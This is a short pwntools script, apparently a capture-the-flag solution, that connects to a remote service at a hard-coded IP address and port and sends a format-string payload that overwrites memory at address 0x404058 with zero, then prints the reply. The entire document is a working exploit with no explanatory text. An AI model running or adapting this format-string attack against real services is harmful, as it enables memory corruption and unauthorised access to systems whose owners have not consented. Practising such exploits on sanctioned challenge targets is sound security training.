from pwn import *

context.arch = "amd64"
context.log_level = "info"

io = remote("134.112.58.12", 10005)
io.recvuntil(b"Speak, and it will write your words: ")

payload = fmtstr_payload(
    6,
    {0x404058: 0}
)

log.info(f"payload length = {len(payload)}")
log.info(f"payload = {payload!r}")

io.sendline(payload)

print(repr(io.recvall(timeout=2)))

io.close()